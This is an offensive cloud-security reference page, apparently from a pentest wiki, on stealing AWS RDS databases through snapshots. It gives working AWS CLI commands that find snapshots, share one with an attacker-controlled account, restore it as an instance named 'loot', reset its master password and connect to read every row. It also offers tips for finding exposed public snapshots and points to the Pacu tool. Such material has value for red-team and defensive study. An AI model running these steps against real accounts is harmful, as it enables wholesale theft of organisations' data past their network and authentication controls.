---
title: "Snapshots: reading a database offline through a shared or public snapshot"
description: "Sharing or copying RDS snapshots and restoring them into an attacker instance to read the database offline."
keywords:
  - RDS
  - snapshot
  - restore
  - public
  - data recovery
---

# Snapshots

An RDS snapshot is a full copy of the database. With `rds:ModifyDBSnapshotAttribute` you can share a snapshot with an account you control (or with everyone), then restore it into your own instance and read every row, bypassing the source instance's network and auth controls entirely. Even without sharing rights, an existing snapshot restored in place gives a second instance whose master password you set.

## Finding and sharing snapshots

```bash
aws rds describe-db-snapshots --query 'DBSnapshots[].DBSnapshotIdentifier'
aws rds describe-db-snapshots --snapshot-type public        # already-public snapshots
aws rds describe-db-snapshots --snapshot-type shared        # shared with you

# share a snapshot with an attacker-controlled account
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier <snap> \
  --attribute-name restore --values-to-add <attacker-acct-id>
```

## Restoring and reading

```bash
# in the account the snapshot is shared into, restore to a new instance you control
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier loot --db-snapshot-identifier <snap-arn> \
  --publicly-accessible
# then set a master password you know and connect
aws rds modify-db-instance --db-instance-identifier loot \
  --master-user-password 'Newpass123!' --apply-immediately
mysql -h <loot-endpoint> -u admin -p   # or psql for Postgres/Aurora
```

## Exploitation notes

- Sharing a snapshot encrypted with the default KMS key fails; the snapshot must be copied to a key you can share, or be unencrypted, which narrows but does not close the path.
- Public snapshots across the account are a quick win: `describe-db-snapshots --snapshot-type public` with an account filter finds data someone exposed by mistake.
- Restoring in place is noisier (a new instance appears) but needs no cross-account trust.

## Tools

- **AWS CLI** (`rds modify-db-snapshot-attribute`, `restore-db-instance-from-db-snapshot`).
- **Pacu** (`rds__explore_snapshots`): automates copy, restore, and read.

## References

- [AWS: sharing a DB snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html)
- [Rhino Security Labs: RDS snapshot exfiltration](https://rhinosecuritylabs.com/aws/exploiting-aws-iam-permissions-rds/)
- [Pacu: AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
